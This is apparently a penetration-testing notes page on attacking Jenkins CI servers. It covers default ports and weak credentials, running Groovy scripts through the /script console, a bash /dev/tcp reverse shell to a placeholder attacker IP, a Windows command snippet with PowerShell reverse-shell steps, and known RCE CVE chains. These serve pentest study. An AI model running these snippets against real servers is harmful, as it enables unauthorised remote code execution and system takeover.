<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/web-exploitation/jenkins</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/web-exploitation/jenkins"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/now/">now</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>jenkins</h1>

<p>CI (continuous integration) server written in java. runs in servlet containers like tomcat. over 300 plugins available. various vulnerabilities &lt;3. often runs as a high-privileged user.</p>

<h2>discovery - enumeration</h2>

<p>jenkins runs on tomcat port 8080 by default. it also uses port 5000 to attach secondary servers. during internal pentests, it often have weak, default credentials, or no credentials at all.</p>

<h2>attack paths</h2>

<h3>using the script console - groovy scripts</h3>

<p>the script console accessible at <code>/script</code> allows us to run apache groovy scripts. any platform with the JRE installed can run groovy scripts once it&#39;s compiled to java bytecode.</p>

<p>to run any system command on linux, we can run the following script:</p>

<div class="highlight"><pre class="highlight groovy"><code><span class="kt">def</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s1">'&lt;command&gt;'</span>
<span class="kt">def</span> <span class="n">sout</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">(),</span> <span class="n">serr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">()</span>
<span class="kt">def</span> <span class="n">proc</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="na">execute</span><span class="o">()</span>
<span class="n">proc</span><span class="o">.</span><span class="na">consumeProcessOutput</span><span class="o">(</span><span class="n">sout</span><span class="o">,</span> <span class="n">serr</span><span class="o">)</span>
<span class="n">proc</span><span class="o">.</span><span class="na">waitForOrKill</span><span class="o">(</span><span class="mi">1000</span><span class="o">)</span>
<span class="n">println</span> <span class="n">sout</span>
</code></pre></div>

<p>from there, obtaining a reverse shell from various ways becomes easy. here is an example against a linux host:</p>

<div class="highlight"><pre class="highlight groovy"><code><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s2">"/bin/bash"</span><span class="o">,</span><span class="s2">"-c"</span><span class="o">,</span><span class="s2">"exec 5&lt;&gt;/dev/tcp/&lt;attack box IP&gt;/&lt;port&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="k">as</span> <span class="n">String</span><span class="o">[])</span>
<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
</code></pre></div>

<p>against a windows host, we can use the following snippet to run arbitrary commands:</p>

<div class="highlight"><pre class="highlight groovy"><code><span class="kt">def</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s2">"cmd.exe /c &lt;command&gt;"</span><span class="o">.</span><span class="na">execute</span><span class="o">();</span>
<span class="n">println</span><span class="o">(</span><span class="s2">"${cmd.text}"</span><span class="o">);</span>
</code></pre></div>

<p>we could then upload <code>Invoke-PowerShellTcp.ps1</code>, add the <code>Invoke-PowerShellTcp -Reverse -IPAddress &lt;attack box IP&gt; -Port &lt;port&gt;</code> line at the end of the script, then execute it with a listener ready on our end to gain a reverse shell.</p>

<h3>exploiting known vulnerabilities</h3>

<p>RCE vulnerabilities are numerous depending of the version of jenkins in use. for instance, an exploit combines both <code>CVE-2018-1999002</code> and <code>CVE-2019-1003000</code> to gain pre-auth RCE. dynamic routing can also be leveraged to bypass the overall / read ACL, and then use groovy to download a malicious JAR file on jenkins version 2.137.</p>

<p>in jenkins 2.150.2, users with job creation and build privileges can execute remote commands with node.js. it requires authentication but if anonymous users are allowed, they have the required privileges by default and can readily exploit this vulnerability.</p>

<p>all in all, jenkins vulnerabilities are fun to explore and experiment with.</p>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

